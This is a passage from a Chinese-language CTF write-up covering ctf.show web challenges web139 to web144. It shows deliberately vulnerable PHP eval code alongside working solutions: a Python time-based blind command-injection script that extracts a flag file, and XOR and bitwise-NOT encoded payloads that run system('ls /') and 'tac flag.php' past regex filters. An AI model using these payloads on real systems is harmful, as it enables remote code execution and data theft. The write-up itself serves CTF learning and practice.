result)<br></code></pre></td></tr></table></figure><p><code>ls /|awk &#39;NR==&#123;0&#125;&#39;</code>: 获取 <code>/</code> 目录下的第 <code>i</code> 个文件或目录的名称。</p><p><code>cut -c &#123;1&#125;</code>: 获取文件名的第 <code>j</code> 个字符。</p><p><code>if [ ... == &#123;2&#125; ]</code>: 判断这个字符是否等于当前循环中的字符 <code>n</code>。</p><p><code>sleep 3</code>: 如果匹配成功，则让服务器等待 3 秒。</p><p>文件在<code>f149_15_h3r3</code>里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><span class="hljs-built_in">str</span>=string.digits+string.ascii_lowercase+<span class="hljs-string">&quot;-&quot;</span><br>result=<span class="hljs-string">&quot;&quot;</span><br>key=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">45</span>):<br>    <span class="hljs-built_in">print</span>(j)<br>    <span class="hljs-keyword">if</span> key==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        payload=<span class="hljs-string">&quot;if [ `cat /f149_15_h3r3|cut -c &#123;0&#125;` == &#123;1&#125; ];then sleep 3;fi&quot;</span>.<span class="hljs-built_in">format</span>(j,n)<br>        <span class="hljs-comment">#print(payload)</span><br>        url=<span class="hljs-string">&quot;http://271efe3f-c200-4c7c-b5fc-0262498db523.challenge.ctf.show/?c=&quot;</span>+payload<br>        <span class="hljs-keyword">try</span>:<br>            requests.get(url,timeout=(<span class="hljs-number">2.5</span>,<span class="hljs-number">2.5</span>))<br>        <span class="hljs-keyword">except</span>:<br>            result=result+n<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>最后要扩个括号</p><h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f1</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f1&#x27;</span>];<br>    <span class="hljs-variable">$f2</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;f2&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f1</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="hljs-variable">$f2</span>))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$f1</span>(<span class="hljs-subst">$f2</span>());&quot;</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$code</span>) == <span class="hljs-string">&#x27;ctfshow&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>字符串进行整数转化是0,所以只要保证$code是否为0就行了</p><h3 id="0x01-16"><a href="#0x01-16" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f1=md5&amp;f2=phpinfo <span class="hljs-comment">#进行加密之后开头是字母</span><br></code></pre></td></tr></table></figure><p>成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(‘FLASE’)，空指令，失败返回FLASE。</p><h3 id="0x02-16"><a href="#0x02-16" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f1=system&amp;f2=system <span class="hljs-comment">#bool为false</span><br></code></pre></td></tr></table></figure><h3 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">f1=usleep&amp;f2=usleep   <span class="hljs-comment"># usleep() 没有返回值，调用 usleep() 将导致 eval() 返回 null。当 null 传递给 intval() 时，返回值是 0。</span><br></code></pre></td></tr></table></figure><h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-17 19:28:09</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>preg_match(&#39;/^\W+$/&#39;, $v3)</code> 这段代码的作用是检查变量 <code>$v3</code> 是否 <strong>只包含一个或多个非单词字符</strong>（例如空格、标点符号等），且整个字符串从头到尾都符合这个条件。如果是这样，则返回 <code>1</code>，否则返回 <code>0</code>。简单的说就是不能包含字母数字。</p><p>利用取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;?c=(~&quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;)(~&quot;</span>.<span class="hljs-variable">$d</span>.<span class="hljs-string">&quot;);&quot;</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F);<br></code></pre></td></tr></table></figure><p>个人解惑：通过加上 <code>-</code> 号，可以构造出一个合法的数学或逻辑运算符，使得最终的表达式可以被 <code>eval()</code> 正常解析和执行。以前写的没有遇到加<code>-</code>的</p><h2 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-17 19:36:02</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>))&#123;<br>        <span class="hljs-variable">$d</span> = (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$v1</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span> * <span class="hljs-number">0x36d</span>);<br>        <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-variable">$d</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>相当于睡眠下面的式子，可以输入v1&#x3D;0可以变为0,下面的式子<br>$$<br>d&#x3D;(int)(v1×877^5)<br>$$</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0<br></code></pre></td></tr></table></figure><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-18 12:48:14</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;get out hacker!&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>多加了<code>+</code>,<code>-</code>,<code>~</code>不可以用取反了，可以尝试进行异或绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=*(<span class="hljs-string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="hljs-string">&quot;%0c%0c&quot;</span>^<span class="hljs-string">&quot;%60%7f&quot;</span>)*<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=2&amp;v3=*(<span class="hljs-string">&quot;%0c%06%0c%0b%05%0d&quot;</span>^<span class="hljs-string">&quot;%7f%7f%7f%7f%60%60&quot;</span>)(<span class="hljs-string">&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;</span>^<span class="hljs-string">&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;</span>)*<br></code></pre></td></tr></table></figure><p>脚本是使用yu师傅的rce生成，然后用python进行构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>&#125;<br><span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>  <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br><span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><br>fun=<span class="hljs-string">&quot;system&quot;</span><br>cmd=<span class="hljs-string">&quot;tac flag.php&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;function:&quot;</span>+action(fun))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cmd:&quot;</span>+action(cmd))<br><br></code></pre></td></tr></table></figure><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-10-13 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-10-18 16:21:15</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$v1</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>    <span class="hljs-variable">$v2</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>    <span class="hljs-variable">$v3</span> = (String)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$v3</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\W+$/&#x27;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-variable">$code</span> =  <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;return <span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span>;&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$v1</span><span class="hljs-subst">$v3</span><span class="hljs-subst">$v2</span> = &quot;</span>.<span class="hljs-variable">$code</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>)===<span class="hljs-number">1</span>?<span class="hljs-literal">true</span>:<span 